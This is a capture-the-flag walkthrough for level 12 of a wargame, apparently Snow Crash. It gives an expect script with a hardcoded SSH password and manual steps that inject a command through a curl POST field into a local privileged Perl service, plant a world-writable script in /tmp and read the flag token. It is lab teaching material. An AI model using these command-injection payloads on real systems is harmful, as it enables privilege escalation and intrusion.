# Level 12
- In the shell of your choice run the script attached or follow the steps bellow using your VM IP address to get the flag, also root privileges and some dependencies may be needed to install before
	```sh
	$ chmod u+x script.sh
	$ ./script.sh
	$ cat script.sh
	#!/usr/bin/expect -f
	set ip 192.168.1.103
	spawn ssh -o "StrictHostKeyChecking no" level12@$ip -p 4242 "mkdir -p /tmp/FLAG ; cd /tmp/FLAG ; rm -rf ./* ; chmod 777 . ; echo \"\\\`getflag > /tmp/FLAG/token\\\`\" > SCRIPT ; chmod 777 SCRIPT ; curl -s 127.0.0.1:4646 -d \"x=\\\$\(/*/FLAG/SCRIPT\)\" ; cat /tmp/FLAG/token"
	expect "sword:"
	send "fa6v5ateaw21peobuub8ipe6s\r"
	interact
	```
- List content of the home directory
	```sh
	$ ls -l
	```
- View content of the `level12.pl` file
	```sh
	$ cat level12.pl
	```
- Make `FLAG` directory in `/tmp` location
	```sh
	$ mkdir -p /tmp/FLAG
	$ rm -rf /tmp/FLAG/*
	```
- Create `SCRIPT` file in that directory
	```sh
	$ echo "\`getflag > /tmp/FLAG/token\`" > /tmp/FLAG/SCRIPT
	```
- Change access mode to those directory and file to `777`
	```sh
	$ chmod 777 /tmp/FLAG
	$ chmod 777 /tmp/FLAG/SCRIPT
	```
- Run the following commands to get the flag
	```sh
	$ curl 127.0.0.1:4646 -d "x=\$(/*/FLAG/SCRIPT)"
	$ cat /tmp/FLAG/token
	```
- With the token provided `g1qKMiRpXf53AWhDaU7FEkczr` switch to the next user level
	```sh
	$ su level13
	Password: g1qKMiRpXf53AWhDaU7FEkczr
	```
